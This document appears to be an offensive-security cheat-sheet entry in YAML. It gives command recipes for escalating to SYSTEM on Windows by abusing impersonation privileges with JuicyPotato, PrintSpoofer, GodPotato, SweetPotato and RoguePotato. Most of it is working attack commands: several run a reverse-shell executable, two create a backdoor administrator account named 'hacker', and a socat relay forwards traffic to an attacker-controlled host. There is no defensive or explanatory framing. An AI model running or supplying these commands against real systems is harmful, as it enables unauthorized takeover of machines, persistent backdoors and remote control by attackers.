---
description: |
  Exploit SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege using Potato attacks (JuicyPotato, PrintSpoofer, GodPotato, SweetPotato, RoguePotato) to escalate to SYSTEM.
commands:
  - have: Shell
    cmd: |
      # Check for impersonation privileges
      whoami /priv
      # Look for: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

      # --- JuicyPotato ---
      JuicyPotato.exe -l 1337 -p C:\Temp\reverse.exe -t *
      JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p cmd.exe -a "/c C:\Temp\reverse.exe" -t *

      # --- PrintSpoofer (Windows 10 / Server 2016+) ---
      PrintSpoofer.exe -i -c cmd
      PrintSpoofer.exe -c "C:\Temp\reverse.exe"

      # --- GodPotato ---
      GodPotato.exe -cmd "C:\Temp\reverse.exe"
      GodPotato.exe -cmd "cmd /c whoami"
      GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add"

      # --- SweetPotato ---
      SweetPotato.exe -p C:\Temp\reverse.exe
      SweetPotato.exe -p cmd.exe -a "/c net user hacker P@ssw0rd /add"

      # --- RoguePotato ---
      # On attacker: set up socat redirect
      socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.27:9999
      # On target:
      RoguePotato.exe -r 10.10.10.21 -e "C:\Temp\reverse.exe" -l 9999
phase:
  - PrivEsc
target_os:
  - Windows
services: []
techniques:
  - Token_Impersonation
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
  - https://github.com/itm4n/PrintSpoofer
  - https://github.com/BeichenDream/GodPotato
---
